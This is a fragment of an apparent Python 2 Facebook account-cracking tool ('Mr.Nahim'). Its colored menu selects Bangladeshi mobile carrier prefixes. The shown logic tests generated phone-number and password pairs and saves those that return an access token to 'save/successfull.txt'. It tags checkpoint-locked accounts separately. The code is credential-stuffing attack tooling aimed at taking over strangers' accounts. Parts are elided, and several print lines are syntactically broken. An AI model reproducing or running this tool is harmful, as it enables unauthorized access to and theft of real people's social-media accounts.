...
def menu():
    ...
    print '\x1b[1;93mAUTHOR   : \x1b[1;92ᎷᎡ.ΝᎪᎻᏆᎷ                                          
    print '\x1b[1;93mFACEBOOK : \x1b[1;92𝑪𝒉𝒂𝒏𝒅 𝑴𝒖𝒉𝒂𝒎𝒎𝒂𝒅 𝑲𝒉𝒂𝒏' 
    print '\x1b[1;93mGITHUB   : \x1b[1;92ΝᎪᎻᏆᎷ404
    print ''
    print '\x1b[1;97m============================================'
    print '\x1b[1;91m[1]  \x1b[1;93mGP'
    print '\x1b[1;91m[2]  \x1b[1;93mRobi'
    print '\x1b[1;91m[3]  \x1b[1;93mAirtel'
    print '\x1b[1;91m[4]  \x1b[1;93mBanglalink'
    print '\x1b[1;91m[5]  \x1b[1;93mTeletalk'
    print '\x1b[1;95m[0]  \x1b[1;95mExit            '
    print '\x1b[1;97m============================================'
    action()
...
def action():
    ...
    time.sleep(0.5)
    psb('+  [\xe2\x9c\x93] PLEASE WITH, PROCESS IS RUNNING ...')
    time.sleep(0.5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[𝑴𝒓.𝑵𝒂𝒉𝒊𝒎-OK]\x1b[0m ' + k + c + user + ' | ' + pass1  +  '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[𝑴𝒓.𝑵𝒂𝒉𝒊𝒎-CP]\x1b[1;93m ' + k + c + user + ' | ' + pass1  +  '\x1b[1;93m  [Open After 07 Days]\x1b[0m \n'
